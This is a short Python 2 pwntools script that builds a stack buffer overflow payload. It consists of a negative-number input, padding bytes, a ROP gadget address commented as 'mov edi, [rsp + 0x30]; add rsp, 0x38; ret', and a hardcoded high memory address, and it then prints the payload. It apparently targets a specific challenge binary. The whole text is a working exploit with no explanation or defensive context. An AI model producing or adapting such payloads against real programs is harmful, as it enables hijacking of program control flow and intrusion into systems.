from pwn import *

payload = '-1\n' + 'a'*120   #mov edi, [rsp + 0x30]; add rsp, 0x38; ret
payload += p64(0x00400810)
payload += 'b'*20+'a'*28+'BBBB'+'A'*4
payload += p64(0x7ff80159a450)
#print len(payload)

print payload



